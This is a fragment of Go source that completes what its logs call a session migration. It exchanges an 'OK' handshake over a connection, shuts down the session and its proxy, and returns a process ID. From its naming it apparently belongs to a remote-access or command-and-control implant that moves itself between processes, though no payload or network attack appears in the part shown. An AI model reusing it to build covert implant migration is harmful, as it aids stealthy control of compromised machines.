	// Set a short arbitrary timeout as we only need to read the "OK" value.
	c.SetReadDeadline(time.Now().Add(time.Second * 2))
	if err = r.ReadUint16(&k); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if k != 0x4F4B { // 0x4F4B == "OK"
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, xerr.Sub("unexpected OK value", 0x45)
	}
	if s.state.Set(stateClosing); cout.Enabled {
		s.log.Debug("[%s/Mg8] Received 'OK' from host, proceeding with shutdown!", s.ID)
	}
	if s.lock.Unlock(); s.proxy != nil && s.proxy.IsActive() {
		_ = s.proxy.Close()
	}
	s.state.Set(stateClosing)
	for s.Wake(); ; {
		if time.Sleep(500 * time.Microsecond); s.state.Closed() {
			break
		}
	}
	if s.lock.Lock(); cout.Enabled {
		s.log.Debug("[%s/Mg8] Got lock, migrate completed!", s.ID)
	}
	w.WriteUint16(0x4F4B)
	c.Close()
	e.Release()
	close(s.ch)
	return e.Pid(), nil
}
